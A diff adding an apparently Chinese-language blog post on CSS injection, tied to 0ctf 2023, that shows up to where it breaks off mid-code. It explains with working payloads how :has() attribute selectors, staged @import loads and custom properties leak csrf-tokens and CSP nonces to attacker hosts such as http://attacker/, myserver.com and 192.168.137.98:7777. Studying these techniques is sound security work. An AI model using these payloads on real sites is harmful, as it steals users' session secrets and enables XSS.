@@ -1,0 +1,1260 @@
+<!DOCTYPE html><html lang="en">
+  <head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no"><title>前端安全：CSS 注入 - DumKiy's blog</title>
+
+<meta name="description" content="前端安全：CSS 注入css 注入通常用于窃取页面敏感信息，例如 csrf-token，csp 中的 nonce 值等。通常配合 xss、csrf 漏洞一同使用。CSS 注入原理下面的 payload 展示了一个窃取 csrf-token 的示例。&lt;!DOCTYPE html&gt;&lt;head&gt;...">
+<link rel="canonical" href="/css/2023/12/12/CSS-injection.html"><link rel="alternate" type="application/rss+xml" title="DumKiy's blog" href="/feed.xml"><!-- start favicons snippet, use https://realfavicongenerator.net/ --><link rel="apple-touch-icon" sizes="180x180" href="/assets/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/favicon-16x16.png"><link rel="manifest" href="/assets/site.webmanifest"><link rel="mask-icon" href="/assets/safari-pinned-tab.svg" color="#fc4d50"><link rel="shortcut icon" href="/assets/favicon.ico">
+
+<meta name="msapplication-TileColor" content="#ffc40d"><meta name="msapplication-config" content="/assets/browserconfig.xml">
+
+<meta name="theme-color" content="#ffffff">
+<!-- end favicons snippet --><link rel="stylesheet" href="/assets/css/main.css"><link rel="stylesheet" href="https://cdn.bootcdn.net/ajax/libs/font-awesome/5.15.1/css/all.css" ><!-- start custom head snippets -->
+
+<!-- end custom head snippets -->
+<script>(function() {
+  window.isArray = function(val) {
+    return Object.prototype.toString.call(val) === '[object Array]';
+  };
+  window.isString = function(val) {
+    return typeof val === 'string';
+  };
+
+  window.hasEvent = function(event) {
+    return 'on'.concat(event) in window.document;
+  };
+
+  window.isOverallScroller = function(node) {
+    return node === document.documentElement || node === document.body || node === window;
+  };
+
+  window.isFormElement = function(node) {
+    var tagName = node.tagName;
+    return tagName === 'INPUT' || tagName === 'SELECT' || tagName === 'TEXTAREA';
+  };
+
+  window.pageLoad = (function () {
+    var loaded = false, cbs = [];
+    window.addEventListener('load', function () {
+      var i;
+      loaded = true;
+      if (cbs.length > 0) {
+        for (i = 0; i < cbs.length; i++) {
+          cbs[i]();
+        }
+      }
+    });
+    return {
+      then: function(cb) {
+        cb && (loaded ? cb() : (cbs.push(cb)));
+      }
+    };
+  })();
+})();
+(function() {
+  window.throttle = function(func, wait) {
+    var args, result, thisArg, timeoutId, lastCalled = 0;
+
+    function trailingCall() {
+      lastCalled = new Date;
+      timeoutId = null;
+      result = func.apply(thisArg, args);
+    }
+    return function() {
+      var now = new Date,
+        remaining = wait - (now - lastCalled);
+
+      args = arguments;
+      thisArg = this;
+
+      if (remaining <= 0) {
+        clearTimeout(timeoutId);
+        timeoutId = null;
+        lastCalled = now;
+        result = func.apply(thisArg, args);
+      } else if (!timeoutId) {
+        timeoutId = setTimeout(trailingCall, remaining);
+      }
+      return result;
+    };
+  };
+})();
+(function() {
+  var Set = (function() {
+    var add = function(item) {
+      var i, data = this._data;
+      for (i = 0; i < data.length; i++) {
+        if (data[i] === item) {
+          return;
+        }
+      }
+      this.size ++;
+      data.push(item);
+      return data;
+    };
+
+    var Set = function(data) {
+      this.size = 0;
+      this._data = [];
+      var i;
+      if (data.length > 0) {
+        for (i = 0; i < data.length; i++) {
+          add.call(this, data[i]);
+        }
+      }
+    };
+    Set.prototype.add = add;
+    Set.prototype.get = function(index) { return this._data[index]; };
+    Set.prototype.has = function(item) {
+      var i, data = this._data;
+      for (i = 0; i < data.length; i++) {
+        if (this.get(i) === item) {
+          return true;
+        }
+      }
+      return false;
+    };
+    Set.prototype.is = function(map) {
+      if (map._data.length !== this._data.length) { return false; }
+      var i, j, flag, tData = this._data, mData = map._data;
+      for (i = 0; i < tData.length; i++) {
+        for (flag = false, j = 0; j < mData.length; j++) {
+          if (tData[i] === mData[j]) {
+            flag = true;
+            break;
+          }
+        }
+        if (!flag) { return false; }
+      }
+      return true;
+    };
+    Set.prototype.values = function() {
+      return this._data;
+    };
+    return Set;
+  })();
+
+  window.Lazyload = (function(doc) {
+    var queue = {js: [], css: []}, sources = {js: {}, css: {}}, context = this;
+    var createNode = function(name, attrs) {
+      var node = doc.createElement(name), attr;
+      for (attr in attrs) {
+        if (attrs.hasOwnProperty(attr)) {
+          node.setAttribute(attr, attrs[attr]);
+        }
+      }
+      return node;
+    };
+    var end = function(type, url) {
+      var s, q, qi, cbs, i, j, cur, val, flag;
+      if (type === 'js' || type ==='css') {
+        s = sources[type], q = queue[type];
+        s[url] = true;
+        for (i = 0; i < q.length; i++) {
+          cur = q[i];
+          if (cur.urls.has(url)) {
+            qi = cur, val = qi.urls.values();
+            qi && (cbs = qi.callbacks);
+            for (flag = true, j = 0; j < val.length; j++) {
+              cur = val[j];
+              if (!s[cur]) {
+                flag = false;
+              }
+            }
+            if (flag && cbs && cbs.length > 0) {
+              for (j = 0; j < cbs.length; j++) {
+                cbs[j].call(context);
+              }
+              qi.load = true;
+            }
+          }
+        }
+      }
+    };
+    var load = function(type, urls, callback) {
+      var s, q, qi, node, i, cur,
+        _urls = typeof urls === 'string' ? new Set([urls]) : new Set(urls), val, url;
+      if (type === 'js' || type ==='css') {
+        s = sources[type], q = queue[type];
+        for (i = 0; i < q.length; i++) {
+          cur = q[i];
+          if (_urls.is(cur.urls)) {
+            qi = cur;
+            break;
+          }
+        }
+        val = _urls.values();
+        if (qi) {
+          callback && (qi.load || qi.callbacks.push(callback));
+          callback && (qi.load && callback());
+        } else {
+          q.push({
+            urls: _urls,
+            callbacks: callback ? [callback] : [],
+            load: false
+          });
+          for (i = 0; i < val.length; i++) {
+            node = null, url = val[i];
+            if (s[url] === undefined) {
+              (type === 'js' ) && (node = createNode('script', { src: url }));
+              (type === 'css') && (node = createNode('link', { rel: 'stylesheet', href: url }));
+              if (node) {
+                node.onload = (function(type, url) {
+                  return function() {
+                    end(type, url);
+                  };
+                })(type, url);
+                (doc.head || doc.body).appendChild(node);
+                s[url] = false;
+              }
+            }
+          }
+        }
+      }
+    };
+    return {
+      js: function(url, callback) {
+        load('js', url, callback);
+      },
+      css: function(url, callback) {
+        load('css', url, callback);
+      }
+    };
+  })(this.document);
+})();
+</script><script>
+  (function() {
+    var TEXT_VARIABLES = {
+      version: '2.2.6',
+      sources: {
+        font_awesome: 'https://cdn.bootcdn.net/ajax/libs/font-awesome/5.15.1/css/all.css',
+        jquery: 'https://cdn.bootcss.com/jquery/3.1.1/jquery.min.js',
+        leancloud_js_sdk: '//cdn.jsdelivr.net/npm/leancloud-storage@3.13.2/dist/av-min.js',
+        chart: 'https://cdn.bootcss.com/Chart.js/2.7.2/Chart.bundle.min.js',
+        gitalk: {
+          js: 'https://cdn.bootcss.com/gitalk/1.2.2/gitalk.min.js',
+          css: 'https://cdn.bootcss.com/gitalk/1.2.2/gitalk.min.css'
+        },
+        valine: 'https://unpkg.com/valine/dist/Valine.min.js',
+        mathjax: 'https://cdn.bootcss.com/mathjax/2.7.4/MathJax.js?config=TeX-MML-AM_CHTML',
+        mermaid: 'https://cdn.bootcss.com/mermaid/8.0.0-rc.8/mermaid.min.js'
+      },
+      site: {
+        toc: {
+          selectors: 'h1,h2,h3,h4'
+        }
+      },
+      paths: {
+        search_js: '/assets/search.js'
+      }
+    };
+    window.TEXT_VARIABLES = TEXT_VARIABLES;
+  })();
+</script>
+</head>
+  <body>
+    <div class="root" data-is-touch="false">
+      <div class="layout--page js-page-root"><div class="page__main js-page-main page__viewport has-aside cell cell--auto">
+
+      <div class="page__main-inner"><div class="page__header d-print-none"><header class="header"><div class="main">
+      <div class="header__title">
+        <div class="header__brand"><?xml version="1.0" standalone="no"?>
+<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 20010904//EN"
+ "http://www.w3.org/TR/2001/REC-SVG-20010904/DTD/svg10.dtd">
+<svg version="1.0" xmlns="http://www.w3.org/2000/svg"
+ width="512.000000pt" height="512.000000pt" viewBox="0 0 512.000000 512.000000"
+ preserveAspectRatio="xMidYMid meet">
+<metadata>
+Created by potrace 1.14, written by Peter Selinger 2001-2017
+</metadata>
+<g transform="translate(0.000000,512.000000) scale(0.100000,-0.100000)"
+fill="#000000" stroke="none">
+<path d="M825 4372 c-184 -12 -365 -129 -444 -287 -64 -129 -61 -53 -58 -1555
+l2 -1365 29 -70 c58 -141 151 -240 280 -299 110 -51 50 -49 1941 -48 1722 0
+1772 1 1837 20 183 52 330 209 373 395 13 58 15 235 13 1429 -2 995 -6 1370
+-14 1388 -7 14 -20 45 -30 70 -66 161 -226 287 -401 316 -36 6 -3441 12 -3528
+6z m3557 -236 c31 -13 70 -34 86 -47 42 -34 92 -113 107 -168 9 -35 11 -365
+10 -1376 -1 -1473 4 -1368 -66 -1459 -19 -24 -52 -56 -75 -70 -94 -60 34 -56
+-1883 -56 -1617 0 -1762 1 -1807 17 -27 9 -54 21 -61 27 -6 6 -27 22 -47 36
+-46 33 -92 112 -104 180 -15 77 -9 2674 5 2716 36 104 126 190 224 212 28 6
+684 10 1799 11 l1755 0 57 -23z"/>
+<path d="M1241 3509 c-27 -11 -47 -32 -61 -66 -22 -53 1 -81 409 -489 l395
+-394 -395 -394 c-289 -290 -397 -404 -406 -430 -31 -90 68 -165 154 -117 10 5
+215 207 455 448 291 291 439 447 443 466 4 15 4 39 0 55 -7 30 -860 893 -907
+918 -31 16 -53 17 -87 3z"/>
+<path d="M2551 1809 c-105 -14 -133 -147 -41 -194 44 -23 1336 -23 1380 0 71
+37 73 136 4 182 -23 15 -84 16 -662 17 -350 1 -657 -2 -681 -5z"/>
+</g>
+</svg>
+<a title="Watch And Learn
+" href="/">DumKiy's blog</a></div><button class="button button--secondary button--circle search-button js-search-toggle"><i class="fas fa-search"></i></button></div><nav class="navigation">
+        <ul><li class="navigation__item"><a href="/">Home</a></li><li class="navigation__item"><a href="/categories.html">Categories</a></li><li class="navigation__item"><a href="/tags.html">tags</a></li><li class="navigation__item"><a href="/about.html">About</a></li><li class="navigation__item"><a href="/Resources.html">Resources</a></li><li class="navigation__item"><a href="https://github.com/DummyKitty">GitHub</a></li><li><button class="button button--secondary button--circle search-button js-search-toggle"><i class="fas fa-search"></i></button></li></ul>
+      </nav></div>
+  </header>
+</div><div class="page__content"><div class ="main"><div class="grid grid--reverse">
+
+              <div class="col-aside d-print-none js-col-aside"><aside class="page__aside js-page-aside"><div class="toc-aside js-toc-root"></div>
+</aside></div>
+
+              <div class="col-main cell cell--auto"><!-- start custom main top snippet -->
+
+<!-- end custom main top snippet -->
+<article itemscope itemtype="http://schema.org/Article"><div class="article__header"><header><h1>前端安全：CSS 注入</h1></header><span class="split-space">&nbsp;</span>
+          <a class="edit-on-github"
+            title="Edit on Github"
+            href="https://github.com/user_name/repo_name/tree/master/_posts/2023-12-12-CSS-injection.md">
+            <i class="far fa-edit"></i></a></div><meta itemprop="headline" content="前端安全：CSS 注入"><div class="article__info clearfix">
+      <div class="right-col">
+         <ul class="menu"> <span style="font-size: 1.2em;">📂</span><li>
+              <a class="button button--secondary button--pill button--sm"
+                href="/categories.html?tag=CSS">CSS</a>
+            </li></ul>
+      </div>
+      <div class="right-col"><ul class="left-col menu"> <span style="font-size: 1.2em;">📌</span><li>
+              <a class="button button--secondary button--pill button--sm"
+                href="/tags.html?tag=CSS">CSS</a>
+            </li><li>
+              <a class="button button--secondary button--pill button--sm"
+                href="/tags.html?tag=0ctf+2023">0ctf 2023</a>
+            </li></ul></div><ul class="left-col menu"><li><i class="far fa-calendar-alt"></i> <span>Dec 12, 2023</span>
+            </li></ul></div><meta itemprop="author" content="DumKiy"/><meta itemprop="datePublished" content="2023-12-12T18:29:48+08:00">
+    <meta itemprop="keywords" content="CSS,0ctf 2023"><div class="js-article-content"><div class="layout--article"><!-- start custom article top snippet -->
+
+<!-- end custom article top snippet -->
+<div class="article__content" itemprop="articleBody"><h1 id="前端安全css-注入">前端安全：CSS 注入</h1>
+<p>css 注入通常用于窃取页面敏感信息，例如 csrf-token，csp 中的 nonce 值等。通常配合 xss、csrf 漏洞一同使用。</p>
+<h2 id="css-注入原理">CSS 注入原理</h2>
+<p>下面的 payload 展示了一个窃取 csrf-token 的示例。</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;<span class="o">!</span>DOCTYPE html&gt;
+
+&lt;<span class="nb">head</span><span class="o">&gt;</span>
+    &lt;style&gt;
+        form:has<span class="o">(</span>input[name<span class="o">=</span><span class="s2">"csrf-token"</span><span class="o">][</span>value^<span class="o">=</span><span class="s2">"a"</span><span class="o">]){</span>
+            background: url<span class="o">(</span><span class="s2">"http://attacker/?q=a"</span><span class="o">)</span><span class="p">;</span>
+        <span class="o">}</span>
+    &lt;/style&gt;
+    &lt;meta <span class="nv">charset</span><span class="o">=</span><span class="s2">"UTF-8"</span><span class="o">&gt;</span>
+&lt;/head&gt;
+
+&lt;body&gt;
+    &lt;form <span class="nv">action</span><span class="o">=</span><span class="s2">"/action"</span><span class="o">&gt;</span>
+        &lt;input <span class="nv">name</span><span class="o">=</span><span class="s2">"username"</span><span class="o">&gt;</span>
+        &lt;input <span class="nb">type</span><span class="o">=</span><span class="s2">"submit"</span><span class="o">&gt;</span>
+        &lt;input <span class="nb">type</span><span class="o">=</span><span class="s2">"hidden"</span> <span class="nv">name</span><span class="o">=</span><span class="s2">"csrf-token"</span> <span class="nv">value</span><span class="o">=</span><span class="s2">"abc123"</span><span class="o">&gt;</span>
+    &lt;/form&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre></div></div>
+<p>在这个 payload 中，我们使用 has 选择器，从 form 表单中选择满足 name=”csrf-token”，value 以 a 开头的 input 标签，如果能够获取到这样的标签，就通过 background 加载远程图片。</p>
+
+<p>换句话来说，如果能够插入这样一行 css 代码，并且 csrf-token 确实以 a 开头，那么就能够受到一个请求。通过遍历就可以确认第一个字符。</p>
+<div class="language-css highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="nt">form</span><span class="nd">:has</span><span class="o">(</span><span class="nt">input</span><span class="o">[</span><span class="nt">name</span><span class="o">=</span><span class="s1">"csrf-token"</span><span class="o">][</span><span class="nt">value</span><span class="o">^=</span><span class="s1">"a"</span><span class="o">])</span><span class="p">{</span>
+        <span class="nl">background</span><span class="p">:</span> <span class="sx">url("http://attacker/?q=a")</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="nt">form</span><span class="nd">:has</span><span class="o">(</span><span class="nt">input</span><span class="o">[</span><span class="nt">name</span><span class="o">=</span><span class="s1">"csrf-token"</span><span class="o">][</span><span class="nt">value</span><span class="o">^=</span><span class="s1">"b"</span><span class="o">])</span><span class="p">{</span>
+        <span class="nl">background</span><span class="p">:</span> <span class="sx">url("http://attacker/?q=b")</span><span class="p">;</span>
+    <span class="p">}</span>
+    
+    <span class="nt">form</span><span class="nd">:has</span><span class="o">(</span><span class="nt">input</span><span class="o">[</span><span class="nt">name</span><span class="o">=</span><span class="s1">"csrf-token"</span><span class="o">][</span><span class="nt">value</span><span class="o">^=</span><span class="s1">"c"</span><span class="o">])</span><span class="p">{</span>
+        <span class="nl">background</span><span class="p">:</span> <span class="sx">url("http://attacker/?q=c")</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="o">...</span>
+</code></pre></div></div>
+<p>得到第一个字符后（假设为 a），就可以开始遍历第二个字符。</p>
+<div class="language-css highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="nt">form</span><span class="nd">:has</span><span class="o">(</span><span class="nt">input</span><span class="o">[</span><span class="nt">name</span><span class="o">=</span><span class="s1">"csrf-token"</span><span class="o">][</span><span class="nt">value</span><span class="o">^=</span><span class="s1">"aa"</span><span class="o">])</span><span class="p">{</span>
+        <span class="nl">background</span><span class="p">:</span> <span class="sx">url("http://attacker/?q=a")</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="nt">form</span><span class="nd">:has</span><span class="o">(</span><span class="nt">input</span><span class="o">[</span><span class="nt">name</span><span class="o">=</span><span class="s1">"csrf-token"</span><span class="o">][</span><span class="nt">value</span><span class="o">^=</span><span class="s1">"ab"</span><span class="o">])</span><span class="p">{</span>
+        <span class="nl">background</span><span class="p">:</span> <span class="sx">url("http://attacker/?q=b")</span><span class="p">;</span>
+    <span class="p">}</span>
+    
+    <span class="nt">form</span><span class="nd">:has</span><span class="o">(</span><span class="nt">input</span><span class="o">[</span><span class="nt">name</span><span class="o">=</span><span class="s1">"csrf-token"</span><span class="o">][</span><span class="nt">value</span><span class="o">^=</span><span class="s1">"ac"</span><span class="o">])</span><span class="p">{</span>
+        <span class="nl">background</span><span class="p">:</span> <span class="sx">url("http://attacker/?q=c")</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="o">...</span>
+</code></pre></div></div>
+<p>利用这样侧信道的方式，循环遍历就可以获取到所有的 csrf-token。</p>
+
+<p>但其中存在一个问题，如果要一次将所有 payload 注入进去，大小写字母及数字加起来 62 个，如果要遍历每种组合的话 payload 将会非常长，特别是 token 长度一般也不会短。</p>
+
+<p>如果分段注入呢？例如先注入猜解第一个字符的 payload，确认第一个字符之后，再注入猜解第二个字符的 payload。但这又会出现一个问题，页面需要进行刷新才能加载新的 payload，而刷新之后，csrf-token 往往会发生变化。</p>
+
+<p>Pepe Vila 在 2019 提出了新的利用方式：@import，可以在不刷新页面的情况下，分阶段加载 css。</p>
+
+<p>@import 可以进一步加载其他的 css。示例 payload 如下：</p>
+<div class="language-css highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">@import</span> <span class="sx">url(https://myserver.com/start?len=8)</span>
+</code></pre></div></div>
+<p>攻击者服务器可以回复下面的 payload，此时客户端会逐个请求。</p>
+<div class="language-css highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">@import</span> <span class="sx">url(https://myserver.com/payload?len=1)</span>
+<span class="err">@</span><span class="n">import</span> <span class="sx">url(https://myserver.com/payload?len=2)</span>
+<span class="err">@</span><span class="n">import</span> <span class="sx">url(https://myserver.com/payload?len=3)</span>
+<span class="err">@</span><span class="n">import</span> <span class="sx">url(https://myserver.com/payload?len=4)</span>
+<span class="err">@</span><span class="n">import</span> <span class="sx">url(https://myserver.com/payload?len=5)</span>
+<span class="err">@</span><span class="n">import</span> <span class="sx">url(https://myserver.com/payload?len=6)</span>
+<span class="err">@</span><span class="n">import</span> <span class="sx">url(https://myserver.com/payload?len=7)</span>
+<span class="err">@</span><span class="n">import</span> <span class="sx">url(https://myserver.com/payload?len=8)</span>
+</code></pre></div></div>
+<p>客户端请求 payload?len=1 时，攻击者可以回复枚举第一个字符的 payload。</p>
+<div class="language-css highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="nt">form</span><span class="nd">:has</span><span class="o">(</span><span class="nt">input</span><span class="o">[</span><span class="nt">name</span><span class="o">=</span><span class="s1">"csrf-token"</span><span class="o">][</span><span class="nt">value</span><span class="o">^=</span><span class="s1">"a"</span><span class="o">])</span><span class="p">{</span>
+        <span class="nl">background</span><span class="p">:</span> <span class="sx">url("http://attacker/?q=a")</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="nt">form</span><span class="nd">:has</span><span class="o">(</span><span class="nt">input</span><span class="o">[</span><span class="nt">name</span><span class="o">=</span><span class="s1">"csrf-token"</span><span class="o">][</span><span class="nt">value</span><span class="o">^=</span><span class="s1">"b"</span><span class="o">])</span><span class="p">{</span>
+        <span class="nl">background</span><span class="p">:</span> <span class="sx">url("http://attacker/?q=b")</span><span class="p">;</span>
+    <span class="p">}</span>
+    
+    <span class="nt">form</span><span class="nd">:has</span><span class="o">(</span><span class="nt">input</span><span class="o">[</span><span class="nt">name</span><span class="o">=</span><span class="s1">"csrf-token"</span><span class="o">][</span><span class="nt">value</span><span class="o">^=</span><span class="s1">"c"</span><span class="o">])</span><span class="p">{</span>
+        <span class="nl">background</span><span class="p">:</span> <span class="sx">url("http://attacker/?q=c")</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="o">...</span>
+</code></pre></div></div>
+<p>第一个字符确认后，再生成 payload?len=2 的响应内容，客户端此时请求该 url 时，攻击者就可以回复特定的 payload。</p>
+<div class="language-css highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="nt">form</span><span class="nd">:has</span><span class="o">(</span><span class="nt">input</span><span class="o">[</span><span class="nt">name</span><span class="o">=</span><span class="s1">"csrf-token"</span><span class="o">][</span><span class="nt">value</span><span class="o">^=</span><span class="s1">"aa"</span><span class="o">])</span><span class="p">{</span>
+        <span class="nl">background</span><span class="p">:</span> <span class="sx">url("http://attacker/?q=a")</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="nt">form</span><span class="nd">:has</span><span class="o">(</span><span class="nt">input</span><span class="o">[</span><span class="nt">name</span><span class="o">=</span><span class="s1">"csrf-token"</span><span class="o">][</span><span class="nt">value</span><span class="o">^=</span><span class="s1">"ab"</span><span class="o">])</span><span class="p">{</span>
+        <span class="nl">background</span><span class="p">:</span> <span class="sx">url("http://attacker/?q=b")</span><span class="p">;</span>
+    <span class="p">}</span>
+    
+    <span class="nt">form</span><span class="nd">:has</span><span class="o">(</span><span class="nt">input</span><span class="o">[</span><span class="nt">name</span><span class="o">=</span><span class="s1">"csrf-token"</span><span class="o">][</span><span class="nt">value</span><span class="o">^=</span><span class="s1">"ac"</span><span class="o">])</span><span class="p">{</span>
+        <span class="nl">background</span><span class="p">:</span> <span class="sx">url("http://attacker/?q=c")</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="o">...</span>
+</code></pre></div></div>
+<p>后面的过程依次类推。</p>
+
+<p>这种方式也有一些需要注意的地方：</p>
+<ol>
+  <li>浏览器对同一个域名发起的请求有上限。如果请求太多仍旧会被限制，但也可以通过设置多个子域名来绕过限制，比如 a.attacker.com，b.attacker.com。</li>
+  <li>firefox 下 payload 有所不同，原因在于 firefox 不会逐个 import css，而是一次性加载，这样就达不到分阶段确认字符的目的。 Michał Bentkowski 的文章提出了解决办法：<a href="https://research.securitum.com/css-data-exfiltration-in-firefox-via-single-injection-point/">CSS data exfiltration in Firefox via a single injection point - research.securitum.com</a></li>
+</ol>
+
+<p>chrome 和 firefox 通用 payload：</p>
+<div class="language-css highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&lt;</span><span class="nt">style</span><span class="o">&gt;</span><span class="k">@import</span> <span class="sx">url(https://myserver.com/payload?len=1)</span><span class="err">&lt;</span><span class="p">/</span><span class="n">style</span><span class="err">&gt;</span>
+<span class="err">&lt;</span><span class="n">style</span><span class="err">&gt;@</span><span class="n">import</span> <span class="sx">url(https://myserver.com/payload?len=2)</span><span class="err">&lt;</span><span class="p">/</span><span class="n">style</span><span class="err">&gt;</span>
+<span class="err">&lt;</span><span class="n">style</span><span class="err">&gt;@</span><span class="n">import</span> <span class="sx">url(https://myserver.com/payload?len=3)</span><span class="err">&lt;</span><span class="p">/</span><span class="n">style</span><span class="err">&gt;</span>
+<span class="err">&lt;</span><span class="n">style</span><span class="err">&gt;@</span><span class="n">import</span> <span class="sx">url(https://myserver.com/payload?len=4)</span><span class="err">&lt;</span><span class="p">/</span><span class="n">style</span><span class="err">&gt;</span>
+<span class="err">&lt;</span><span class="n">style</span><span class="err">&gt;@</span><span class="n">import</span> <span class="sx">url(https://myserver.com/payload?len=5)</span><span class="err">&lt;</span><span class="p">/</span><span class="n">style</span><span class="err">&gt;</span>
+<span class="err">&lt;</span><span class="n">style</span><span class="err">&gt;@</span><span class="n">import</span> <span class="sx">url(https://myserver.com/payload?len=6)</span><span class="err">&lt;</span><span class="p">/</span><span class="n">style</span><span class="err">&gt;</span>
+<span class="err">&lt;</span><span class="n">style</span><span class="err">&gt;@</span><span class="n">import</span> <span class="sx">url(https://myserver.com/payload?len=7)</span><span class="err">&lt;</span><span class="p">/</span><span class="n">style</span><span class="err">&gt;</span>
+<span class="err">&lt;</span><span class="n">style</span><span class="err">&gt;@</span><span class="n">import</span> <span class="sx">url(https://myserver.com/payload?len=8)</span><span class="err">&lt;</span><span class="p">/</span><span class="n">style</span><span class="err">&gt;</span>
+</code></pre></div></div>
+
+<h2 id="更快的枚举">更快的枚举</h2>
+<p>文章 <a href="https://www.sonarsource.com/blog/code-vulnerabilities-leak-emails-in-proton-mail/">Code Vulnerabilities Put Proton Mails at Risk - Sonar</a> 展示了一种更快的枚举方式。</p>
+
+<p>通过示例代码可以更好地理解：</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;<span class="nb">head</span><span class="o">&gt;</span>
+    &lt;meta <span class="nv">charset</span><span class="o">=</span><span class="s2">"UTF-8"</span><span class="o">&gt;</span>
+    &lt;meta http-equiv<span class="o">=</span><span class="s2">"Content-Security-Policy"</span>
+      <span class="nv">content</span><span class="o">=</span><span class="s2">"script-src 'nonce-aaaqhkkzvf5mc3iv090nyysyq6wc80ai4v1'; frame-src 'none'; object-src 'none'; base-uri 'self'; style-src 'unsafe-inline'"</span><span class="o">&gt;</span>
+  &lt;/head&gt;
+  &lt;style&gt;
+    :has<span class="o">(</span>script[nonce<span class="k">*</span><span class="o">=</span><span class="s2">"aaa"</span><span class="o">]){</span><span class="nt">--tosend-aaa</span>: url<span class="o">(</span>http://192.168.137.98:7777?x<span class="o">=</span>aaa<span class="o">)</span><span class="p">;</span><span class="o">}</span>
+    :has<span class="o">(</span>script[nonce<span class="k">*</span><span class="o">=</span><span class="s2">"aab"</span><span class="o">]){</span><span class="nt">--tosend-aab</span>: url<span class="o">(</span>http://192.168.137.98:7777?x<span class="o">=</span>aab<span class="o">)</span><span class="p">;</span><span class="o">}</span>
+    :has<span class="o">(</span>script[nonce<span class="k">*</span><span class="o">=</span><span class="s2">"aac"</span><span class="o">]){</span><span class="nt">--tosend-aac</span>: url<span class="o">(</span>http://192.168.137.98:7777?x<span class="o">=</span>aac<span class="o">)</span><span class="p">;</span><span class="o">}</span>
+
+    input<span class="o">{</span>
+        background: var<span class="o">(</span><span class="nt">--tosend-aaa</span>, none<span class="o">)</span>,
+        var<span class="o">(</span><span class="nt">--tosend-aab</span>, none<span class="o">)</span>,
+        var<span class="o">(</span><span class="nt">--tosend-aac</span>, none<span class="o">)</span>,
+        var<span class="o">(</span><span class="nt">--tosend-aad</span>, none<span class="o">)</span>
+    <span class="o">}</span>
+
+  &lt;/style&gt;
+  &lt;body&gt;
+    &lt;input&gt;
+    &lt;script <span class="nv">nonce</span><span class="o">=</span><span class="s2">"nonce-aaaqhkkzvf5mc3iv090nyysyq6wc80ai4v1"</span><span class="o">&gt;</span>
+        console.log<span class="o">(</span>1<span class="o">)</span>
+    &lt;/script&gt;
+  &lt;/body&gt;
+</code></pre></div></div>
+<p>页面中的 CSP 设置了 nonce 值，只有 nonce 属性值与 CSP 中设置的值相同的 JS 内链脚本才能够被执行，这个机制通常用于 XSS 防护。攻击者需要窃取到该值才能够正常运行 XSS。</p>
+
+<p>其中 css 注入 payload 如下。</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    :has<span class="o">(</span>script[nonce<span class="k">*</span><span class="o">=</span><span class="s2">"aaa"</span><span class="o">]){</span><span class="nt">--tosend-aaa</span>: url<span class="o">(</span>http://192.168.137.98:7777?x<span class="o">=</span>aaa<span class="o">)</span><span class="p">;</span><span class="o">}</span>
+
+    input<span class="o">{</span>
+        background: var<span class="o">(</span><span class="nt">--tosend-aaa</span>, none<span class="o">)</span>,
+        var<span class="o">(</span><span class="nt">--tosend-aab</span>, none<span class="o">)</span>,
+        var<span class="o">(</span><span class="nt">--tosend-aac</span>, none<span class="o">)</span>,
+        var<span class="o">(</span><span class="nt">--tosend-aad</span>, none<span class="o">)</span>
+    <span class="o">}</span>
+</code></pre></div></div>
+<p>其作用就是在页面选择 nonce 值包含了 aaa 的 script 标签（<code class="language-plaintext highlighter-rouge">*=</code> 表示 nonce 值含有 aaa 时），如果能够选择到，则设定一个自定义属性 tosend-aaa（自定义属性以 – 开头），通过这个属性向外发起请求。</p>
+
+<p>定义 input 样式的作用在于调用自定义参数，从而触发向外的请求，换用其他标签也同样可以，例如 div。</p>
+
+<p>由于 nonce 中存在 aaa，因此可以受到一个 aaa 的请求：</p>
+
+<p><img src="https://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/20231212195241.png" alt="20231212195241" /></p>
+
+<p>如何获取完整的字符串呢？假设 none 值为 32 位随机字符串：
+qhkkzvf5mc3iv090nyysyq6wc80ai4v1</p>
+
+<p>我们可以通过上面的方式，每次获取 3 位的子串，获取到 30 个不重复的子串，通过回溯的方式即可恢复整个字符串。比如 f5m 的后两位为 5m, 5m 又是 5mc 的开头，那么就可以确认 f5m 后一个字符为 c。</p>
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="sh">'</span><span class="s">f5m</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">c3i</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">i4v</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">3iv</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">zvf</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">iv0</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">syq</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">0ai</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">6wc</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">kkz</span><span class="sh">'</span><span class="p">,</span> <span 